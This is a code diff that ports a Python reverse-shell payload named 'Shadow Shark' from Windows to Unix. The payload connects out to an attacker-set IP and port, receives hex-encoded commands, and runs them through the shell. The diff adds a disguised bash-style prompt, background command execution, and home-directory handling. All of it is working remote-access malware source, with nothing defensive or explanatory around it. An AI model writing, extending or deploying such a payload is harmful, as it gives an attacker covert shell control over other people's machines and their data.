@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-A full fledged Shadow Shark payload for Windows.
+A full fledged Shadow Shark payload for Unix.
 
 @author: Mr. Shark Spam Bot
 """
@@ -9,6 +9,12 @@ import subprocess
 import os
 import codecs
 import json
+import platform
+import getpass
+
+BLUE = '\033[94m'
+GREEN = '\033[92m'
+NORMAL = '\033[0m'
 
 def hex_handler(text, encode=False, decode=False):
     '''Encode or decode text using hex.'''
@@ -26,7 +32,7 @@ def hex_handler(text, encode=False, decode=False):
     return new_text
 
 rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-rev_socket.connect(('IP', PORT))
+rev_socket.connect(('IP', PORT)) # Set IP and port on this line.
 
 while True:
     command = b''
@@ -44,12 +50,30 @@ while True:
     except json.decoder.JSONDecodeError:
         continue
 
+    if 'sudo' in command or 'su' in command:
+        rev_socket.send(hex_handler('sudo and su are not supported.', encode=True))
+        continue
+
     if command == 'exit':
         rev_socket.close()
         break
 
     if command == 'directory':
-        rev_socket.send(hex_handler(os.getcwd() + '>', encode=True))
+        user = getpass.getuser()
+        system = platform.uname().node
+        cwd = os.getcwd()
+        if cwd.startswith(os.path.expanduser('~')):
+            user_path = cwd.split(os.path.expanduser('~'))
+            user_path = ''.join(user_path)
+            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}~{user_path}{NORMAL}$'
+        else:
+            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}{cwd}{NORMAL}$'
+        rev_socket.send(hex_handler(prompt, encode=True))
+        continue
+
+    if command.startswith('background_exec') and len(command.split()) >= 2:
+        background_exec = subprocess.Popen(command[15:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        rev_socket.send(hex_handler('\n', encode=True))
         continue
 
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -67,9 +91,12 @@ while True:
 
     if command.startswith('cd') and len(command.split()) >= 2:
         try:
-            os.chdir(command[3:])
+            if command[3] == '~':
+                os.chdir(f'{os.path.expanduser("~")}{command[4:]}')
+            else:
+                os.chdir(command[3:])
         except IOError:
-            rev_socket.send(hex_handler('The system cannot find path specified.', encode=True))
+            rev_socket.send(hex_handler(f'bash: cd: {command[3:]}: No such file or directory', encode=True))
             continue
 
     rev_socket.send(hex_handler('\n', encode=True))
